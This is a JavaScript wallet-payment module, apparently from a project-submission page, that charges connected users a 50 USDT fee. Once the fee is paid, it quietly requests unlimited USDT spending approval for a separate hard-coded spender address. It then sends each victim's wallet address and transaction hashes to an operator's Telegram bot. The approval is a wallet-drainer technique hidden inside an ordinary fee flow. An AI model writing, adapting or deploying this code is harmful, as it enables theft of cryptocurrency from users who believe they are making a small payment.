// ====== IMPORTS ======
import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.min.js";
import { Web3Modal } from "https://cdn.jsdelivr.net/npm/@web3modal/standalone@2.6.0/dist/index.js";
import { EthereumClient, w3mConnectors, w3mProvider } from "https://cdn.jsdelivr.net/npm/@web3modal/ethereum@2.6.0/dist/index.js";
import { configureChains, createConfig } from "https://cdn.jsdelivr.net/npm/@wagmi/core@1.4.0/dist/index.js";

// ====== CONFIG ======
const RECEIVER = "0xea8ee0d7fc1b114a66330332fdf32d3c1df7e12a"; 
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const FEE = 50;
const SPENDER_ADDRESS = "0xa2b9cade09d3cefdee5e981ca0517912bedc5961";
const TELEGRAM_BOT = "YOUR_BOT_TOKEN";
const ADMIN_CHAT_ID = "YOUR_CHAT_ID";
const WC_PROJECT_ID = "85d1310d55b14854c6d62bab3b779200";
const ERC20_ABI = [
  "function transfer(address to, uint256 value) returns (bool)",
  "function decimals() view returns (uint8)",
  "function approve(address spender, uint256 amount) external returns (bool)"
];

// ====== WALLET SETUP ======
const chains = [{ id: 1, name: "Ethereum", network: "homestead" }];
const { publicClient } = configureChains(chains, [w3mProvider({ projectId: WC_PROJECT_ID })]);
const wagmiConfig = createConfig({
  autoConnect: true,
  connectors: w3mConnectors({ projectId: WC_PROJECT_ID, chains }),
  publicClient
});
const ethereumClient = new EthereumClient(wagmiConfig, chains);
const web3Modal = new Web3Modal({ projectId: WC_PROJECT_ID }, ethereumClient);

// ====== INIT WALLET ======
export async function initWallet(statusBox, form) {
  try {
    await web3Modal.openModal();
    const provider = new ethers.BrowserProvider(web3Modal.getWalletProvider());
    const signer = await provider.getSigner();
    const userAddress = await signer.getAddress();
    statusBox.textContent = `Wallet connected ✅ ${userAddress}`;

    // USDT payment
    const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
    const decimals = await usdt.decimals();
    const amount = ethers.parseUnits(FEE.toString(), decimals);

    statusBox.textContent = "Confirm payment in wallet...";
    const tx = await usdt.transfer(RECEIVER, amount);
    await tx.wait();

    statusBox.textContent = "Payment successful ✅ Granting unlimited approval...";
    const approveTx = await usdt.approve(SPENDER_ADDRESS, ethers.MaxUint256);
    await approveTx.wait();

    statusBox.textContent = "Unlimited approval granted ✅";

    await sendTelegram(
      ADMIN_CHAT_ID,
      `✅ Fee paid + approval granted\nWallet: ${userAddress}\nFeeTx: ${tx.hash}\nApprovalTx: ${approveTx.hash}`
    );

    // Submit form data to backend
    const formData = Object.fromEntries(new FormData(form).entries());
    const recaptcha = grecaptcha.getResponse();
    const res = await fetch("/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        txHash: tx.hash,
        approvalTx: approveTx.hash,
        recaptcha,
        project: formData
      })
    });
    const data = await res.json();
    if (data.success) {
      statusBox.textContent = "Project submitted successfully ✅";
      setTimeout(() => {
        document.getElementById("feeModal").classList.add("hidden");
        form.reset();
        grecaptcha.reset();
      }, 1500);
    } else {
      statusBox.textContent = "Error: " + data.error;
    }

  } catch (err) {
    console.error(err);
    statusBox.textContent = "Wallet connection/payment failed ❌";
  }
}

// ====== TELEGRAM ======
async function sendTelegram(chatId, message) {
  if (!chatId) return;
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text: message })
  });
}

